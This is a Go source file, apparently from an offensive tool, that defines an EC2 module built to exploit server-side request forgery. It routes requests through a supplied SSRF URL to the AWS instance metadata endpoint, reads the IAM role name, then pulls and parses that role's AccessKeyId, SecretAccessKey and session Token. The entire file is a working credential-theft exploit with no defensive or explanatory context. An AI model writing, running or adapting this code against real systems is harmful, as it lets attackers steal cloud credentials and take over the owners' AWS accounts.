package aws

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
)

// EC2 credential
type Ec2 struct {
	IamRole         string
	AccessKeyId     string
	SecretAccessKey string
	Token           string
	Region          string
	SsrfUrl         string
}

// Get EC2 instance metadata via SSRF
func NewEC2Module(url string) *Ec2 {
	fmt.Println("Initializing EC2 module...")
	return &Ec2{
		IamRole:         "",
		AccessKeyId:     "",
		SecretAccessKey: "",
		Token:           "",
		Region:          "us-east-1",
		SsrfUrl:         url,
	}
}

func (ec2 *Ec2) Exploit() *Ec2 {
	fmt.Println("Exploiting EC2 module...")
	ssrfUrl := ec2.SsrfUrl
	imdsUrl := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	response, err := http.Get(ssrfUrl + imdsUrl)
	if err != nil {
		fmt.Println("Ec2 imds http request error: ", err)
		return ec2
	}
	defer response.Body.Close()

	if response.StatusCode == 200 {
		body, err := io.ReadAll(response.Body)
		defer response.Body.Close()
		if err != nil {
			fmt.Println("Read response body err:", err)
			os.Exit(1)
		}
		ec2.IamRole = string(body)

		response, err := http.Get(ssrfUrl + imdsUrl + ec2.IamRole)
		if err != nil {
			fmt.Println("Ec2 imds credential http request error: ", err)
			return ec2
		}
		defer response.Body.Close()

		if response.StatusCode == 200 {
			body, err := io.ReadAll(response.Body)
			defer response.Body.Close()
			if err != nil {
				fmt.Println("Read response body err:", err)
				return ec2
			}

			var credentialBody map[string]interface{}
			if err := json.Unmarshal(body, &credentialBody); err != nil {
				fmt.Println("Failed to get credential json value:", err)
				return ec2
			}
			ec2.AccessKeyId = credentialBody["AccessKeyId"].(string)
			ec2.SecretAccessKey = credentialBody["SecretAccessKey"].(string)
			ec2.Token = credentialBody["Token"].(string)

		} else {
			fmt.Println("Failed to get iam role")
			return ec2
		}

	} else {
		fmt.Println("Failed to get iam role")
		return ec2
	}

	return ec2
}
